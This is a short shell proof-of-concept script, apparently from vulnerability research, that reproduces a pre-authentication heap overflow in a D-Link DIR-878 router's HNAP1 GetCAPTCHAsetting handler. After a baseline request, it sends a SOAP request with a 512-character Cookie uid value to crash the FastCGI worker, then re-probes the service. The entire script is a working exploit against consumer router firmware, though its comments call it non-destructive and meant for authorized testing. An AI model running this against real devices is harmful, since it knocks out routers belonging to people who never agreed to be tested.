#!/bin/sh
# Reproduction script for: DIR-878 GetCAPTCHAsetting Cookie uid heap overflow (pre-auth)
# Derived from the request recorded in README.md. Non-destructive: crashes only the FastCGI
# worker, which lighttpd restarts automatically. Nothing is written to flash.
# Authorized testing only.
T="${1:?usage: sh poc.sh <router-ip>}"
BODY='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetCAPTCHAsetting xmlns="http://purenetworks.com/HNAP1/"></GetCAPTCHAsetting></soap:Body></soap:Envelope>'
echo "[*] Control (uid=baseline_ok) - expect 200 OK"
curl -s -o /dev/null -w "    HTTP %{http_code}\n" -X POST "http://$T/HNAP1/" \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetCAPTCHAsetting"' \
  -H 'Cookie: uid=baseline_ok' -H 'Content-Type: text/xml' --data-binary "$BODY"
echo "[*] Attack (uid = 512 x E) - expect 500 (SIGSEGV)"
UIDVAL=$(printf 'E%.0s' $(seq 512))
curl -s -o /dev/null -w "    HTTP %{http_code}\n" -X POST "http://$T/HNAP1/" \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetCAPTCHAsetting"' \
  -H "Cookie: uid=$UIDVAL" -H 'Content-Type: text/xml' --data-binary "$BODY"
echo "[*] Re-probe - worker should be back (lighttpd restarts it)"
curl -s -o /dev/null -w "    HTTP %{http_code}\n" -X POST "http://$T/HNAP1/" \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetCAPTCHAsetting"' \
  -H 'Cookie: uid=after' -H 'Content-Type: text/xml' --data-binary "$BODY"
